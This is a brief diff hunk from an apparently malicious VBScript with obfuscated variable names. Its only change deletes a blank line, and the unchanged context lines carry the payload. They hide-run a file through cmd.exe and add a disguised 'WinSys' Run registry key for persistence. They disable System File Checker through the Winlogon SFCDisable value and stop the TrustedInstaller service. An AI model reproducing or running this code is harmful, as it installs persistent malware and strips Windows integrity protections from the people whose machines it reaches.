@@ -12,7 +12,6 @@ x7p9q.Run "cmd.exe /c '" & f & "'", 0, False
 On Error Resume Next
 k9m2v.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinSys", f, "REG_SZ"
 x7p9q.Run "reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v SFCDisable /t REG_DWORD /d 1 /f", 0, True
-
 x7p9q.Run "net stop TrustedInstaller /y", 0, True
 If Not q3z8k.FolderExists("C:\Temp") Then q3z8k.CreateFolder("C:\Temp")
 
